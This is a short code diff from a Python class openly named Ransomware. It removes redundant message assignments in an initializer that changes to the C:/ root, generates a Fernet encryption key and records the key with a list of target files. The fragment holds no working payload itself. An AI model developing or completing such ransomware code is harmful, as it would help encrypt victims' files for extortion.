@@ -13,13 +13,11 @@ class Ransomware:
         os.chdir("C:/")  # on Mac -- /Users or /
         files_dict = {}
         key = Fernet.generate_key()
-        message = ""
         self.files = files
         self.directories = directories
         self.key = key
         self.files_dict = files_dict
 
-        self.message = message
         self.message = f"KEY : {key} +\n files_list : {files}"
 
     def id_generator(self, size, chars=string.ascii_lowercase + string.digits):
